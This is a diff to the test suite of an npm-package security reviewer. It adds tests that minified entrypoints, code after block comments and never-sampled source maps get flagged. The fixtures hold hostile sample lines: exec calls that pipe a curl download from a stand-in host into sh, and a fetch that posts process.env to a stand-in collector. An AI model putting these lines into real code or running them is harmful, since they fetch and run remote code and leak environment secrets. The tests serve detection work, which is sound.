@@ -375,7 +375,46 @@ describe("review", () => {
     expect(padded).toEqual(expect.arrayContaining([...plain, "file.control-bytes:high"]));
   });
 
-  test("file.control-bytes grades by release status and flags binary entrypoints, not imported assets", () => {
+  test.each(["index.min.js", "dist/app.min.cjs", "dist/app.min.mjs"])(
+    "a minified entrypoint (%s) reaches the content rules",
+    async (path) => {
+      const source =
+        "const cp=require('child_process');cp.exec('curl https://payload.example.invalid/a.sh | sh');" +
+        "fetch('https://collect.example.invalid',{method:'POST',body:JSON.stringify(process.env)});\n";
+      const manifest = JSON.stringify({ name: "pkg", version: "1.0.0", main: path });
+      const staged = [
+        await summarizeFile("package.json", new TextEncoder().encode(manifest)),
+        await summarizeFile(path, new TextEncoder().encode(source)),
+      ];
+      const findings = deterministicFindings(staged, createPackageDiff([], staged));
+      expect(findings.map((finding) => `${finding.ruleId}:${finding.severity}`)).toContain(
+        "code.remote-shell:critical",
+      );
+    },
+  );
+
+  test("code after a block comment closing on the same line is scanned for remote shells", () => {
+    const payload =
+      'require("child_process").exec("curl -s https://payload.example.invalid/w.sh | sh");';
+    const remoteShell = (text) => {
+      const staged = [
+        { path: "package.json", size: 1, sha256: "p", flags: [], textSample: '{"main":"a.js"}' },
+        { path: "a.js", size: text.length, sha256: "a", flags: [], textSample: text },
+      ];
+      return deterministicFindings(staged, createPackageDiff([], staged))
+        .filter((finding) => finding.ruleId === "code.remote-shell")
+        .map((finding) => finding.line);
+    };
+    expect(remoteShell(`/*! lib v1 | MIT */${payload}`)).toEqual([1]);
+    expect(remoteShell(`/* a */ /* b */${payload}`)).toEqual([1]);
+    expect(remoteShell(`/**\n * banner\n */${payload}`)).toEqual([3]);
+    expect(remoteShell("/* equivalent to: curl -s https://api.example.invalid | sh */\n")).toEqual(
+      [],
+    );
+    expect(remoteShell("/*\n curl -s https://api.example.invalid | sh\n*/\n")).toEqual([]);
+  });
+
+  test("control-byte source and unsampled entrypoints grade by release status, imported assets stay quiet", () => {
     const manifest = {
       path: "package.json",
       size: 60,
@@ -385,8 +424,9 @@ describe("review", () => {
         name: "pkg",
         version: "1.0.1",
         main: "lib/main.dat",
-        bin: { pkg: "lib/util.js" },
-        exports: { ".": "./lib/main.dat", "./empty": "./index.js" },
+        bin: { pkg: "lib/util.js", "pkg-empty": "index.js", "pkg-map": "lib/run.js.map" },
+        // Export targets are assets as often as code, so they do not count.
+        exports: { "./font": "./assets/font.dat" },
       }),
     };
     const hidden = {
@@ -399,21 +439,26 @@ describe("review", () => {
     const entry = { path: "lib/main.dat", size: 40, sha256: "main", flags: ["binary"] };
     const data = { path: "assets/font.dat", size: 40, sha256: "font", flags: ["binary"] };
     const empty = { path: "index.js", size: 0, sha256: "empty", flags: ["binary"] };
-    const staged = [manifest, hidden, entry, data, empty];
-    const controlBytes = (previous) =>
+    const map = { path: "lib/run.js.map", size: 40, sha256: "map", flags: ["text-sample-skipped"] };
+    const staged = [manifest, hidden, entry, data, empty, map];
+    const hiddenCode = (previous) =>
       deterministicFindings(staged, createPackageDiff(previous, staged), undefined, {
         previousFiles: previous,
       })
-        .filter((finding) => finding.ruleId === "file.control-bytes")
-        .map((finding) => [finding.file, finding.severity]);
+        .filter(
+          (finding) => finding.ruleId.startsWith("file.") && finding.ruleId !== "file.large-binary",
+        )
+        .map((finding) => [finding.ruleId, finding.file, finding.severity]);
 
-    expect(controlBytes([])).toEqual([
-      ["lib/util.js", "high"],
-      ["lib/main.dat", "high"],
+    expect(hiddenCode([])).toEqual([
+      ["file.control-bytes", "lib/util.js", "high"],
+      ["file.unsampled-entrypoint", "lib/main.dat", "high"],
+      ["file.unsampled-entrypoint", "lib/run.js.map", "high"],
     ]);
-    expect(controlBytes(staged)).toEqual([
-      ["lib/util.js", "medium"],
-      ["lib/main.dat", "medium"],
+    expect(hiddenCode(staged)).toEqual([
+      ["file.control-bytes", "lib/util.js", "medium"],
+      ["file.unsampled-entrypoint", "lib/main.dat", "medium"],
+      ["file.unsampled-entrypoint", "lib/run.js.map", "medium"],
     ]);
   });
 
@@ -2775,16 +2820,22 @@ describe("review", () => {
           flags: ["content-skipped", "native-pe"],
         },
         { path: "runtime/client.js.map", status: "modified", flags: ["content-skipped"] },
-        { path: "dist/bundle.min.js", status: "modified", flags: ["content-skipped"] },
       ],
     });
 
     expect(findings).toEqual([
       expect.objectContaining({ ruleId: "tar.suspicious-entry", severity: "info" }),
     ]);
+    // Minified bundles are sampled like any file, so a hash-only one lost coverage.
+    for (const path of ["dist/bundle.min.js", "dist/theme.min.css"]) {
+      const minified = tarSuspiciousEntryFindings(entries, {
+        fileDiff: [{ path, status: "modified", flags: ["content-skipped"] }],
+      });
+      expect(minified[0].severity).toBe("medium");
+    }
   });
 
-  test("escalates the retention-tier notice when a never-sampled bundle is what runs", () => {
+  test("escalates the retention-tier notice when a never-sampled source map is what runs", () => {
     const entries = [
       {
         kind: "retention-tier",
@@ -2792,46 +2843,49 @@ describe("review", () => {
         detail: "2 file bodies were recorded hash-only",
       },
     ];
+    // Node runs any extension a manifest or require() names as JavaScript.
     const changedBundle = [
-      { path: "dist/app.min.js", status: "modified", flags: ["content-skipped"] },
-      { path: "dist/app.min.js.map", status: "modified", flags: ["content-skipped"] },
+      { path: "dist/app.js.map", status: "modified", flags: ["content-skipped"] },
     ];
     const severity = (stagedFiles) =>
       tarSuspiciousEntryFindings(entries, { fileDiff: changedBundle, stagedFiles })[0].severity;
     const hashOnly = changedBundle.map(({ path, flags }) => ({ path, flags }));
     const sampled = (path, textSample) => ({ path, flags: [], textSample });
 
-    expect(severity([...hashOnly, sampled("package.json", '{"main":"./dist/app.min.js"}')])).toBe(
+    expect(severity([...hashOnly, sampled("package.json", '{"main":"./dist/app.js.map"}')])).toBe(
       "medium",
     );
     expect(
       severity([
         ...hashOnly,
-        sampled("package.json", '{"exports":{".":{"require":"./dist/app.min.js"}}}'),
+        sampled("package.json", '{"exports":{".":{"require":"./dist/app.js.map"}}}'),
       ]),
     ).toBe("medium");
     expect(
       severity([
         ...hashOnly,
         sampled("package.json", '{"main":"index.js"}'),
-        sampled("index.js", "module.exports = require(path.join(__dirname, 'dist', 'app.min'));"),
+        sampled(
+          "index.js",
+          "module.exports = require(path.join(__dirname, 'dist', 'app.js.map'));",
+        ),
       ]),
     ).toBe("medium");
     expect(
       severity([
         ...hashOnly,
         sampled("package.json", '{"main":"index.js"}'),
-        sampled("index.js", "module.exports = 1;\n//# sourceMappingURL=app.min.js.map"),
+        sampled("index.js", "module.exports = 1;\n//# sourceMappingURL=app.js.map"),
       ]),
     ).toBe("info");
   });
 
-  test("finds a never-sampled bundle named among millions of distinct tokens", async () => {
+  test("finds a never-sampled source map named among millions of distinct tokens", async () => {
     // Indexing every token outgrows an 80 MB heap.
     await expect(runUnderHeapLimit("neverSampledBundle", 80)).resolves.toBe("info");
     const tokens = distinctTokenText(100_000);
     expect(neverSampledBundleSeverity(tokens)).toBe("info");
-    expect(neverSampledBundleSeverity(`${tokens} require('./dist/APP.MIN')`)).toBe("medium");
+    expect(neverSampledBundleSeverity(`${tokens} require('./dist/APP.JS.MAP')`)).toBe("medium");
   }, 60_000);
 
   test("escalates the retention-tier notice when an uninspected text tail file changed beside binaries", () => {
